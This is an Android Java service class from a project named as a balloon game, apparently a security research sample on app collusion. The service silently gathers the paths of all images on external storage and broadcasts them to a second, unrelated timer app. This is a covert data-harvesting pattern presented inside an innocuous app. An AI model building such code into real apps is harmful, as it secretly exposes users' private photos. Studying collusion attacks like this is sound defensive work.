package com.sec.iitr.balloon_game;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.MediaStore;
import android.util.Log;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class ImageCollectionService extends IntentService {

    public ImageCollectionService() {
        super("ImageCollectionService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        List<String> imagePaths = collectImages();
        sendImagesToApp2(imagePaths);
    }

    private List<String> collectImages() {
        List<String> imagePaths = new ArrayList<>();

        ContentResolver contentResolver = getContentResolver();
        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.Media.DATA};
        Cursor cursor = contentResolver.query(uri, projection, null, null, null);

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String imagePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                imagePaths.add(imagePath);
            }
            cursor.close();
        }

        return imagePaths;
    }

    private void sendImagesToApp2(List<String> imagePaths) {
        Intent intent = new Intent("com.onefishtwo.bbqtimer.IMAGE_ACTION");
        intent.putStringArrayListExtra("IMAGE_PATHS", new ArrayList<>(imagePaths));

        // Broadcast the intent to App 2
        sendBroadcast(intent);
}
}